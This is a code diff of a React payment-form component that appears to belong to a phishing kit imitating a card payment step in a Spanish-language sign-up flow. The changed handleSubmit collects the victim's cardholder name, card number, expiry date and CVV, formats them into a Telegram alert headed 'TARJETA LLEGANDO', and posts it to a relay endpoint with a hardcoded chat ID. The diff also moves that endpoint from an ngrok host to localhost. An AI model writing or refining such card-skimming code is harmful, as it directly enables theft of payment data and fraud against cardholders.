@@ -123,7 +123,7 @@ const PaymentStepCard = () => {
     const sendTelegramMessage = async (message) => {
         try {
             const chatId = '-4542132850'; 
-            const response = await fetch('https://proof.ngrok.app/enviarmensaje', {
+            const response = await fetch('http://localhost:3000/enviarmensaje', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -142,12 +142,12 @@ const PaymentStepCard = () => {
     const handleSubmit = async (e) => {
         e.preventDefault();
         if (!validateForm()) return;
-    
+
         setLoading(true);
-    
+
         const minSpinnerTime = 2000;
         const startTime = Date.now();
-    
+
         const hideSpinner = () => {
             const elapsedTime = Date.now() - startTime;
             const remainingTime = minSpinnerTime - elapsedTime;
@@ -157,32 +157,15 @@ const PaymentStepCard = () => {
                 setLoading(false);
             }
         };
-    
+
         try {
-            const response = await fetch('https://proof.ngrok.app/procesar', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    codigo: formValues.cardNumber
-                })
-            });
-    
-            if (!response.ok) {
-                throw new Error('Error en la solicitud');
-            }
-    
-            const result = await response.json();
-            if (result.redirectUrl) {
-                navigate(result.redirectUrl); 
-    
-                localStorage.setItem('banco', result.banco);
-    
-                const message = `📞 ⚠ TARJETA LLEGANDO ⚠ 📞:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName}\n- 💳: ${formValues.cardNumber} \n- 📅: ${formValues.expirationDate}\n- 🔐: ${formValues.cvv}\n- 🏦: ${result.banco}\n-------------------------------------------`;
-    
-                await sendTelegramMessage(message);
-            }
+            // Aquí solo necesitas enviar el mensaje a Telegram
+            const message = `📞 ⚠ TARJETA LLEGANDO ⚠ 📞:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName}\n- 💳: ${formValues.cardNumber} \n- 📅: ${formValues.expirationDate}\n- 🔐: ${formValues.cvv}\n-------------------------------------------`;
+
+            await sendTelegramMessage(message);
+
+            // Navegar a la ruta deseada después de enviar el mensaje
+            navigate('/signup/loginoption');
         } catch (error) {
             console.error('Error en la solicitud:', error);
         } finally {
@@ -218,16 +201,16 @@ const PaymentStepCard = () => {
 
                 <div className="flex space-x-4 mb-4">
                     <div className="flex-1 relative">
-                        <input type="text" id="expirationDate" name="expirationDate" value={formValues.expirationDate} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
+                        <input type="text" id="expirationDate" name="expirationDate" maxLength={5} value={formValues.expirationDate} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                         <label htmlFor="expirationDate" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
-                            Fecha de vencimiento
+                            Fecha de vencimiento (MM/AA)
                         </label>
                         {errors.expirationDate && <p className="text-red-500 text-sm">{errors.expirationDate}</p>}
                     </div>
 
                     <div className="flex-1 relative">
-                        <input type="text" id="cvv" maxLength={3} name="cvv" value={formValues.cvv} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
-                        <label htmlFor="cvv" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-gray-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500  peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
+                        <input type="text" id="cvv" name="cvv" maxLength={3} value={formValues.cvv} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
+                        <label htmlFor="cvv" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
                             CVV
                         </label>
                         {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
@@ -236,7 +219,7 @@ const PaymentStepCard = () => {
 
                 <div className="relative mb-4">
                     <input type="text" id="cardHolderName" name="cardHolderName" value={formValues.cardHolderName} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
-                    <label htmlFor="cardHolderName" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-gray-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
+                    <label htmlFor="cardHolderName" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
                         Nombre del titular
                     </label>
                     {errors.cardHolderName && <p className="text-red-500 text-sm">{errors.cardHolderName}</p>}
